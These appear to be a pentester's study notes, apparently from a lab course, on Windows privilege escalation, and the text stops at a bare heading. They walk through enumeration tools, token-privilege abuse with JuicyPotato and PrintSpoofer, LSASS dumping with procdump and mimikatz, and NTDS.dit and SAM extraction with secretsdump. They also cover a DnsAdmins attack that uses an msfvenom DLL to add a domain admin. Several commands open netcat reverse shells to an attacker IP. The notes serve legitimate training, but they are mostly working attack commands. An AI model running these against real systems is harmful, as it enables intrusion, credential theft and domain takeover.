| Tool                                                                                                     | Description                                                                                                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt)                                                        | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                                                                                                                             |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)                                                                                                          |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)      | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                                                                                                                                         |
| [SharpUp](https://github.com/GhostPack/SharpUp)                                                          | C# version of PowerUp                                                                                                                                                                                                                                                                                                     |
| [JAWS](https://github.com/411Hall/JAWS)                                                                  | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                                                                                                                                  |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher)                                              | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                                                                                                         |
| [Watson](https://github.com/rasta-mouse/Watson)                                                          | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.                                                                                                                                                                                                    |
| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |
## Situational Awareness
Important to get lay of the land before we can exploit the system. 

### Network Information
Could be possible to find a *dual homed* server. *Dual-homed* means a device belongs to multiple different networks, this could have several virtual or physical network interfaces.
We should always check *routing tables*. 
We can gather information about local domain (ip of domain controllers). We can view the *arp* cache to see other domains that a computer has interacted with. 
Can help with lateral movement.

#### Interfaces, IP Addresses, DNS Information
```
ipconfig /all
```
#### ARP
```
arp -a
```
#### Routing Table
```
route print
```

### Enumerating Protections
Check for *Antivirus* and *End-Point Detection and Response* (`EDR`).
Will help us craft custom payloads or modify tools before compiling them.

Many organizations use a *whitelist* to control which types of applications certain users can run. This could be used to block non-admin users from running `cmd` and `powershell`.

Popular solution is [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) and we can use `GetAppLockerPolicy` cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. 

Early enumeration helps us combat *AV* and *EDR*.

#### Check Windows Defender Status
```
Get-MpComputerStatus
```

#### List AppLocker Rules
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Test Applocker Policy
```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### Initial Enumeration
During our testing we may gain access to a low-privileged shell on a windows domain and need to perform testing to further our access.
We can view sensitive files, capture traffic and view credentials which may help us further our access.

We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:

|   |
|---|
|The highly privileged `NT AUTHORITY\SYSTEM` account, or [LocalSystem](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.|
|The built-in local `administrator` account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.|
|Another local account that is a member of the local `Administrators` group. Any account in this group will have the same privileges as the built-in `administrator` account.|
|A standard (non-privileged) domain user who is part of the local `Administrators` group.|
|A domain admin (highly privileged in the Active Directory environment) that is part of the local `Administrators` group.|
### Key Data Points
*OS name*: Knowing the OS and version will give us an idea of the types of tools that may be available. 
*Version*: May be publicly available exploits for the OS version.
*Running Services*: Knowing what services are running on the host is important, especially those running as `NT AUTHORITY\SYSTEM` or an administrator-level account. A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.

### System Information
Using [tasklist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) command will give us a better idea of running applications.
```
tasklist /svc
```
It is essential to become familiar with standard Windows processes such as [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service), and [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe)

### Display All Environment Variables
`PATH` variables infrequently changed but in the case of python/java may be changed to run commands.
We can view this using `set` its not infrequent to find.

### View Detailed Configuration Information
the `systeminfo` command will show if the box has been patched recently or is a vm.
possible to hide configuration settings from non-admin accounts.

### Patches and Updates
If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the *WMI-Command* binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering)
```
wmic qfe
```
we can also do this with PowerShell using the `Get-Hotfix` cmdlet
```powershell-session
Get-HotFix | ft -AutoSize
```

### Installed Programs
WMI can also be used to display installed software. With this we can find hard exploits
Is `FileZilla`/`Putty`/etc installed? Run `LaZagne`
```cmd-session
wmic product get name
```

```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```

### Display Running Processes
`netstat` will display active `TCP/UDP` connections. Could possibly find a vulnerable service.
```cmd-session
netstat -ano
```

### User and Group Information
Users are often the weakest link in an organization, especially when systems are configured and patched well. Can possibly find password files.

#### Logged-In Users
Always important to determine which users are logged in. 
Are they Idle or Active? Can we determine what they're working on?
During evasive engagements, we may need to tread lightly on a host with other users to avoid  messing with what they're working on.
```cmd-session
query user
```

#### Current User
When we gain access to a host, we should always check what context our user is running under. Sometimes we already have access to `SYSTEM` or equivalent. Some service accounts may have *SeImpersonatePrivilege*, which can be easily abused to escalate privs with [Juicy Potato](https://github.com/ohpe/juicy-potato)
```
echo %USERNAME%
```
##### Current User Privileges
```cmd-session
whoami /priv
```
##### Current Users Group Information
```cmd-session
whoami /groups
```

#### Get All Users
Knowing other users on the system is also important. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use.
```cmd-session
net user
```
#### Get All Groups
Knowing what non-standard groups are present can help us find escalation vectors.
```cmd-session
net localgroup
```
#### Details About a Group
During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.
```cmd-session
net localgroup administrators
```
#### Get Password Policy & Other Account Information
```cmd-session
net accounts
```

## Communication with Process
One of the best places to look for privilege escalation is the processes that are running on the system.
We could  place a web shell on the web server and gain a shell as the user running the web server.
Generally, this is not an administrator but will often have the `SeImpersonate` token, allowing for `Rogue/Juicy/Lonely Potato` to provide SYSTEM permissions.

### Access Tokens
Access tokens are used to describe security context of a process or thread. 
The token includes information about the user account's identity and privileges related to a specific process or thread.
When a user authenticates its password is checked against a security database, and if properly authenticated they will be assigned an access token.
Every time the user interacts with this process the token is presented again.

### Enumerating Network Services
The most common way people interact with processes is through a network socket (DNS, HTTP, SMB, etc.). The [netstat](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) command will display active TCP and UDP connections
```
netstat -ano
```

The main thing to look for are entries listening on a loop back address *127.0.0.1* and *::1* that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`)
Network sockets for localhost are often overlooked and insecure as they're 'not accessible to the network'.

port `tcp 14147` used for filezillas admin panel.

### Named Pipes
Another way processes can communicate is named pipes.
Pipes are files stored in memory that get cleared after being read. Cobalt Strike uses pipes for every command (excluding [BOF](https://www.cobaltstrike.com/help-beacon-object-files)).

1. Beacon starts a named pipe of \.\pipe\msagent_12
2. Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12
3. Server displays what was written into \.\pipe\msagent_12

There are two types of pipes, [named pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) and anonymous pipes
Windows systems use client-server implementation for pipe communication. n this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using `half-duplex`, or a one-way channel with the client only being able to write data to the server, or `duplex`, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.

We can use the tool `PipeList` from the *SysInternals Suite* to enumerate instances of named pipes.

### Listing Named Pipes with Pipelist
```cmd-session
pipelist.exe /accepteula
```

### Listing Pipes with Powershell
```powershell-session
gci \\.\pipe\
```

After obtaining a list of pipes we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to enumerate permissions assigned to a specific named pipe by reviewing the *Discretionary Access List* (DACL) which shows us who has the permissions to modify, write, read, or execute a resourceWe can also review the DACLs of all named pipes using the command `.\accesschk.exe /accepteula \pipe\`.

### Reviewing LSASS Named Pipe Permissions
```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### Named Pipe Attack Example
This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example. Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

#### Checking WindscribeService Named Pipe Permissions
Confirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.
```cmd-session
 accesschk.exe -accepteula -w \pipe\WindscribeService -v
```
From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.


## Windows Privileges Overview
Rights an account is granted to do certain things on the machine.
Grand or Deny access to securable objects dependant on AD environment
Most privs disabled by default and are able to be enabled with an administrative cmd session.

### Windows Auth Process
Security principles are anything that can be authenticated by the windows OS including user and computer accounts, processes that run in the security context, and security groups.
Security principles are indentified with a [Security Identifier (SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows) when a *SID* is created it remains assigned to that principle for its lifetime.

##### Process
1. User attempts to access a securable object 
2. Users *SID* is compared to  [Access Control Entries (ACEs)](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries) within objects security descriptor (contains security info and access rights.)
3. Decision to Grant or Deny access is made.

![[Windows_Auth_Process.png]]
### Rights and Privs in Windows
Contains many groups which grants rights and privs. 

|**Group**|**Description**|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|

### User Rights Assignment
 User rights govern the methods by which a user can log on to a system.

|Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)|Setting Name|Standard Assignment|Description|
|---|---|---|---|
|SeNetworkLogonRight|[Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|
|SeRemoteInteractiveLogonRight|[Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|
|SeBackupPrivilege|[Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|
|SeSecurityPrivilege|[Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
|SeTakeOwnershipPrivilege|[Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|
|SeDebugPrivilege|[Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|
|SeImpersonatePrivilege|[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|
|SeLoadDriverPrivilege|[Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|
|SeRestorePrivilege|[Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|
```
whoami /priv
```
will list user privs. Generally needs to be from an elevated shell.

If it is listed as *Disabled* this isnt the default setting and has been changed to be blocked.

We can view privileges assigned to a binary in the *security* tab of properties.
#### Commonly Abused Privs
1. *SeBackupPrivilege*: Grants read access to any file regardless of *ACL* 
	- Useful for collecting and exfil
2. *SeCreateTokenPrivilege*: Required to create primary token
	- Useful for Priv Esc
3. *SeDebugPrivilege*: Required to debug and adjust memory privilege 
	- Cred Access, Priv Esc, Defense Evasion
4. *SeLoadDriverPrivilege*: Required to load/unload driver
	 - Possible to load/unload malicious drivers
5. *SeRestorePrivilege*: Grand write access control to all files
	- Persistence and Defense Evasion 
6. *SeTakeOwnerPrivilege*: Take ownership of objects without being granted access
	- Persistence, Defense Evasion, Collection
7. *SeTcbPrivilige*: Trusted Computer Base. Trusted protections to subsystems
	- Priv Esc

### SeImpersonate and SeAssignPrimaryToken
Every process has a token that has information about the account thats running it. Not considered secure resources so exist in memory or can be bruteforced. 

To utilize the token we need *SeImpersonate* privileges. Generally only given to admin accounts and removed during hardening. 

Legit programs may use utilise another processes' token to escalate from Administrator to Local System, which has additional privs. They do this by making a call to the windows logon process to obtain a `SYSTEM` token then execute themselves with that token placing it within the system space. 

Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

We can use this after gaining *RCE* via an application that runs in the context of a service account.

### SeImpersonate Example - Juicy Potato
In this context a SQL server is account is running in the context of the default *mssqlserver* account. 
We can connect to the MSSQL client with impacket tools and enable `xp_cmdshell` with `enable_xp_cmdshell` 
`xp_cmdshell` will then act as a shell.

We will then check `whoami /priv` to see that we have *SeImpersonate*. We will then use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to escalate privs. 

We need to upload juicypotato and nc 
`./nc.exe`
	`-l COM listening port`
	`-p program`
	`-a argument passed to program`
	`-t createprocess call`

Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

#### Catching SYSTEM shell
```shell-session
sudo nc -lnvp 8443
```

### PrintSpoofer and RoguePotato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access.
```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.17 8443 -e cmd.exe" -t *
```

## SeDebugPrivilege
To run a particular service or assist in troubleshooting a user may be assigned *SeDebugPrivilege* instead of being added to the administrators group. Can be assigned  in domain policy under `Computer Settings > Windows Settings > Security Settings`.
Can be used to capture sensitive information in memory and modify kernel and application structures

If we find an account we can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good choice is Local Security Authority Subsystem Service (*LSASS*) which stores user credentials.

```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

If successful we can use mimikatz `sekurlsa::minidump` command. we can the use `sekurlsa::logonPasswords` to gain the hash. We can then use this as a pass the hash. 

*Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.*

If  we cannot load tools but have RDP access. We can take a manual dump in task manager. 

### RCE as SYSTEM
We can also leverage *SeDebugPrivilege* for *RCE*. We can launch a child process and using the elevated rights granted to our account to alter normal system behavior to inherit the token of a parent process and impersonate it. 

First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

We can use tasklist to get a list of running proccesses and their PID
```powershell-session
tasklist
```
Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`.
Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user.

## SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
This privilege is assigned to admins by default and would be rare to find on a service account. 

The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

we could use this privilege to potentially take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.

### Leveraging the Privilege 
#### Enabling SeTakeOwnershipPrivilege
Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell-session
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```
#### Choosing a Target File
Checking target file 
```powershell-session
C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
#### Checking File Ownership
We can see that the owner is not shown, meaning that we likely do not have enough permissions over the object to view those details. We can back up a bit and check out the owner of the IT directory.
```powershell-session
cmd /c dir /q 'C:\Department Shares\Private\IT'
```
We can see that the IT share appears to be owned by a service account and does contain a file `cred.txt` with some data inside it.

We can now use the `takeown` windows binary to take ownership of the file 
```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

#### Modifying the File ACL
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

## Windows Built-in Groups
Windows servers and DCs have built in groups that ship with the os or get built in.

### Backup Operators
`Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.
Cant copy data using standard copy command, we need to pragmatically copy it specifying the `FILE_FLAG_BACKUP_SEMANTICS`
We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

#### Importing Libraries
```powershell-session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Verifying SeBackupPrivilege is enabled 
```
Get-SeBackupPrivilege
```
#### Enabling SeBackupPrivilege
```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```
#### Copying a Protected File
```powershell-session
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

### Attacking a Domain Controller - Copying NTDS.dit
The active directory database *NTDS.dit* is a good target as it contains all NLTM hashes for users and objects.
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell-session
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

#### Copying NTDS.dit locally
we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

#### Backing up SAM and SYSTEM reg hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
```
```cmd-session
reg save HKLM\SAM SAM.SAV
```

#### Extracting creds from NTDS.dit
With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials using *DSInternals*.
```powershell-session
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

#### Extracting Hashes with Secretsdump
We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access.
If we crack the passwords we can provide insight into password policy and suggest remediations
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Robocopy
The built in utility `robocopy` can  be used to copy files in backup mode.
```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

## Event Log Readers
Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system.
This can be loaded into a *SIEM* tool or into a search tool for defenders. The tools would then flag any potentially malicious activity, such as the `whoami`, `netstat`, and `tasklist` commands being run from a marketing executive's workstation.
This [study](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html) shows some of the most run commands by attackers after initial access (`tasklist`, `ver`, `ipconfig`, `systeminfo`, etc.), for reconnaissance (`dir`, `net view`, `ping`, `net use`, `type`, etc.), and for spreading malware within a network (`at`, `reg`, `wmic`, `wusa`, etc.)

```cmd-session
 net localgroup "Event Log Readers"
```
We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.

```powershell-session
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

#### Passing Credentials to wevtutil
```cmd-session
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
#### Searching Security Logs Using Get-WinEvent
```powershell-session
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DNSAdmins
Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network
Windows DNS service allows custom plugins and can call functions  from them to resolve name queries that are not in the scope of locally hosted DNS zones.

he DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain.

Possible to use the `dnscmd` to specify dll to load. 
- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

### Levering DnsAdmins Access
#### Generate Malicious DLL
We can generate malicious DLLs with msfvenom to add a user to the domain admins group
```shell-session
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

*We need to then start a local http server and transfer the file*
***Only Members of DNS admins are permitted to add dlls to dnscmd.exe***
```powershell-session
Get-ADGroupMember -Identity DnsAdmins
```
```cmd-session
nscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

*Membership in DNS admins doesn't allow*
#### We first need to find user sid
```cmd-session
wmic useraccount where name="netadm" get sid
```
Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.
```cmd-session
sc.exe sdshow DNS
```
#### Restarting the DNS
```
sc stop dns
```
```
sc start dns
```
#### Confirming if it worked
```cmd-session
net group "Domain Admins" /dom
```
***Make sure to Sign Out and Sign In!!!***

#### Cleanup
Making configuration changes and stopping/starting the dns on a domain controller is a very destructive action. We need to run this by our client before proceeding. We will need to revert changes if we get goahead

### Using Mimilib.dll
